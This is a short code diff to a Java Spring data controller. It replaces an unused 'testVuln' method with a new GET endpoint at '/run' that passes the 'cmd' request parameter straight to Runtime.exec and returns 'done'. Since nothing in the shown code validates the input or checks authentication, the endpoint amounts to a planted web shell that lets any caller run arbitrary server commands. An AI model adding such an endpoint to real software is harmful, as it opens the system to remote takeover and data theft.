@@ -183,9 +183,11 @@ public class DataApiController {
         return ResponseEntity.noContent().build();
     }
 
-    public void testVuln(String userInput) throws Exception {
-    Runtime.getRuntime().exec(userInput);
-        }
+    @GetMapping("/run")
+public String run(@RequestParam String cmd) throws Exception {
+    Runtime.getRuntime().exec(cmd);
+    return "done";
+}
 
     public record CollectionUpsertRequest(
             String seriesId,
